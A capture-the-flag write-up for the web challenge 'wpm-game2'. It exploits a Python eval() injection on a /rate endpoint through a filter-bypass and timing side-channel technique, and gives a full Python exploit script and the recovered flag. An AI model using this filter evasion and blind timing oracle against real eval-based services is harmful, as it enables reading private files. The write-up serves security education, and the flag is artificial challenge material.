# Web/wpm-game2

wpm-game2 497 NoobMaster

No more development platform :(

## Solution:

**Step 1:**
From wpm-game we know that the important vulnerability is the /rate endpoint which does, ```return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))```. 
The ```eval(wpm.lower())``` is very dangerous and we can give the server a python experssion to run and the server will run it.

For the first challenge, we were able to use it to read ```/app/flag.txt``` directly. However, when we run it here, it fails and gives an error instead of leaking the flag. This is because the description says ```No more development platform```, meaning the Flask debug/development platform has been disabled/removed, so our old exploit no longer works.

This means we can't directly leak the flag, but may be able to use another method. A common method is using a side channel, where we do an expression like ```111 ** (condition * 1111111)```, where condition is whether the flag is correct or not. This works because if condition=0 then the expression evaluates much faster.

**Step 2:**
Now that we have the general idea, we need to evade the filter.

My first thought was to brute force each character with ```ord(flag[i])==ord(guess_char)```, but the problem is the following chars are filtered out just like in wpm-game:
```
disallowed = [".","_","import", "=", ",", "'", '"', "attr", "global", "local", ";", ":", "^", "/", ">", "<", "{", "}", "m", "a", "not", "and", "or", "eval", "exec", "for", "in", "chr", "ord", "hex", "int", "repr", "str", "dir", "set", "len", "SENTENCES", "random", "request", "app", "flask"]
```

First problem is the filter filters "=" and "ord", but since ```id()``` is not filtered, we can use ```id(flag[i])``` as a reference for string in the enviornment in order to compare it against the id of another known character we can get from the known flag prefix ```scriptCTF{``` to determine the ids of the other chars.

We then can use fermat's little theorm, which states that ```a^(p-1)=1 mod p``` as long as ```a``` and ```p``` are coprime. The smallest prime above 126 is 127, so we can set that as modulo. With p=127, every nonzero number becomes 1 after applying the equation, while 0^126 remains 0.

For a, we can use id(flag[i]) - id(guess). So the formula becomes ```result = (id(flag[i])-id(guess))^126 mod 127``` (Note: we can't directly use guess we have to make it relative to other characters as descripted below). This returns 0 if the guess is correct and 1 otherwise. Then we can multiple the result by a huge exponent ```111 ** (result * 1111111)``` which will make it take significantly longer for wrong guesses.

This then gives us the timing oracle.

To get the id we know the id('c') == id(flag[1]) so then we can use it as a reference. Since they are spaced by 48 bytes each then:

| Character | id |
|---|---|
| a | id(flag[1])-96 |
| b | id(flag[1])-48 |
| c | id(flag[1]) |
| d | id(flag[1])+48 |
| e | id(flag[1])+96 |

Then lets say we wanted to test if flag[i]=='e' then we would do ```result = (id(flag[i])-(id(flag[1])+96))^126 mod 127```. And if result is 0, then the character would be 'e'.

**Step 3:**

In order to make sure we know roughly when the cutoff is for a correct character (how fast it roughly has to be), we can test how fast running 'r' for index 2 (right) compared to using 'x' for index 2 (wrong). We take 3 tests for using the right char and 3 for using the wrong char and take the median of them. 
Taking the midpoint between the slow and fast medians give us the cutoff.

**Step 4:**
Since we already know it starts with **scriptCTF{** we skip that and start directly at i=9.
In the script, for each character, I test an ```alphabet = "_0123456789abcdefghijklmnopqrstuvwxyz-}"``` and measure the server response time. If it is faster than the cutoff then the character is probably correct and then I verify it one more time.
I keep doing it until I reach "}" and then I stop.

```python
import requests
import time
import statistics
import string

url = "https://6731873d-1b29-4729-8484-552149d91bb0.challs.scriptsorcerers.xyz/rate"
s = requests.Session()

def n(x):
    if x == 0:
        return "id([])%1"

    out = []

    while x >= 111:
        out.append("111")
        x -= 111

    while x >= 11:
        out.append("11")
        x -= 11

    out += ["1"] * x
    return "+".join(out)

def b(txt):
    return "+".join(f"bytes([{n(ord(c))}])" for c in txt)

path = b("/app/flag.txt")
zero = "id([])%1"

def get_char(i):
    i = zero if i == 0 else n(i)
    return f"[*open({path})][{zero}][{i}]"

def make_payload(i, guess):
    c = get_char(i)
    ref = get_char(1)

    k = (-48 * (ord(guess) - ord("c"))) % 127

    r = f"(id({c})+({n(126)})*id({ref})"

    if k:
        r += f"+({n(k)})"

    r += f")%({n(127)})"

    check = f"(({r})**({n(126)}))%({n(127)})"
    payload = f"111**(({check})*1111111)"

    if len(set(payload)) > 18:
        print("bad payload", len(set(payload)), set(payload))
        exit()

    return payload

def test(i, guess):
    p = make_payload(i, guess)
    start = time.perf_counter()

    try:
        s.get(url, params={"wpm": p}, timeout=5)
    except:
        pass

    return time.perf_counter() - start

print("calibrating...")

good = [test(2, "r") for _ in range(3)]
bad = [test(2, "x") for _ in range(3)]

fast = statistics.median(good)
slow = statistics.median(bad)
cutoff = (fast + slow) / 2

print("correct:", good)
print("wrong:", bad)
print("cutoff:", cutoff)

if slow - fast < 0.15:
    print("timing difference looks too small")
    exit()

def check_char(i, c):
    t = test(i, c)
    print(i, repr(c), f"{t:.3f}s")

    if t < cutoff:
        t2 = test(i, c)
        return t2 < cutoff

    return False

flag = "scriptCTF{"
alphabet = "_0123456789abcdefghijklmnopqrstuvwxyz-}"

while not flag.endswith("}"):
    i = len(flag)
    found = False

    for c in alphabet:
        if check_char(i, c):
            flag += c
            found = True
            print("\n", flag, "\n")
            break

    if not found:
        print("couldn't find next char")
        break

print("flag:", flag)
```

After running it I get the flag: **scriptCTF{r3v3ng3_1337_75f12c3e475b}**

## Summary:
1. Notice that development platform is removed and that we can't directly exfiltrate the flag. See that it is possible to do a timing side channel.
2. Adapt code to evade the filter by using ```id()``` and fermats little theorm instead of direct comparison
3. Make sure to set cutoff.
4. Use script and leak   the flag
